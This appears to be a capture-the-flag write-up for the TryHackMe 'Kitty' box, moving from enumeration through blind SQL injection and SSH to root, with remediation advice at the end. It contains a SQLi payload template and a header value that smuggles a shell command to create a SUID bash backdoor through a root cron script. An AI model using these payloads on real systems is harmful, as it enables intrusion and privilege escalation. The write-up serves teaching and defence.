🐱 TryHackMe---Kitty-Writeup
Difficulty: Medium Full Detailed Writeup
  
Category: Web / Privilege Escalation / Linux  
Author: hadrian3689  

---

## 📘 Summary
This writeup documents the full path to compromise the **Kitty** box on TryHackMe.  
The attack chain includes:
- Web enumeration  
- Blind Boolean SQL injection (to recover credentials)  
- SSH foothold as `kitty`  
- Discovery of a local dev instance on `127.0.0.1:8080`  
- Privilege escalation via a **root cron job** executing attacker-controlled input  

**Result:** Create a SUID bash binary → root shell → `/root/root.txt` flag.

---

## 🧭 Table of Contents
1. [Environment Setup](#environment-setup)  
2. [Enumeration](#1-initial-enumeration)  
3. [Web Exploitation (Blind SQLi)](#2-web-blind-sqli)  
4. [Foothold via SSH](#3-foothold-via-ssh)  
5. [Privilege Escalation](#4-privilege-escalation)  
6. [Remediation & Mitigation](#5-remediation--mitigation)  
7. [IOCs & Artifacts](#6-iocs--artifacts)  
8. [Conclusion](#7-conclusion)

---

## Environment Setup
Replace `$IP` with the target IP or export it:
```bash
export IP=<Your_IP>


The development instance listens on 127.0.0.1:8080.
Run curl payloads from the target box as kitty — not from your host.

1️⃣ Initial Enumeration
sudo nmap -sV -p- $IP


Found ports:

22/tcp — SSH

80/tcp — HTTP

Enumerate directories:

gobuster dir -u http://<Your_IP>/ -w /usr/share/wordlists/dirb/common.txt

2️⃣ Web (Blind SQLi)

Register a user and probe login fields.

A blacklist-based SQLi detector triggers messages like:

SQL Injection detected. This incident will be logged!


When triggered, the dev instance logs the X-Forwarded-For header to /var/www/development/logged.

Blind Boolean SQLi (concept):

CMD_WRAPPER = "UNION SELECT 1,1,1,{};"
# username: f"'{CMD_WRAPPER.format(cmd)}-- -"


Extract DB name → tables → columns → kitty’s password → SSH access.

3️⃣ Foothold via SSH
ssh kitty@$IP
id
cat /home/kitty/user.txt

4️⃣ Local Enumeration & Privilege Escalation

List local services:

ss -tlnp


Found: 127.0.0.1:8080 (local dev web app)

Check cron activity (optional):

scp pspy64 kitty@$IP:/tmp
/tmp/pspy64

Key discovery

Root cron executes /opt/log_checker.sh:

#!/bin/sh
while read ip; do
  /usr/bin/sh -c "echo $ip >> /root/logged";
done < /var/www/development/logged
cat /dev/null > /var/www/development/logged


It reads untrusted input and executes it via sh — perfect for command injection.

Exploit

Send a malicious header from kitty:

curl -sS localhost:8080/index.php \
  -d 'password=sleep' \
  -H "X-Forwarded-For: ;cp /bin/bash /tmp/bckdr && chmod 4755 /tmp/bckdr;"


Wait for cron to run, then:

ls -l /tmp/bckdr
/tmp/bckdr -p
id
cat /root/root.txt

5️⃣ Remediation & Mitigation

✅ Never pass untrusted input to a shell (sh -c).
✅ Use prepared statements and strong input validation for SQL queries.
✅ Ensure root crons do not read user-controlled files.
✅ Sanitize and escape headers before logging.
✅ Drop privileges in scripts that handle user data.

6️⃣ IOCs & Artifacts
Artifact	Description
/tmp/bckdr	SUID copy of /bin/bash
/var/www/development/logged	Contains malicious X-Forwarded-For entry
/opt/log_checker.sh	Vulnerable cron script
/root/root.txt	Root flag
7️⃣ Conclusion

Kitty shows how a single insecure log handler combined with blacklist filtering can escalate from SQLi to full root compromise.
Always treat logs as potential attack surfaces — and never process them as root without sanitization.

📚 References

TryHackMe: SQL Injection Module

pspy – Process Activity Monitor

nmap, gobuster, curl, ss

Author: SaGar Shahani

Cybersecurity student • CTF player • AI in Malware Analysis researcher
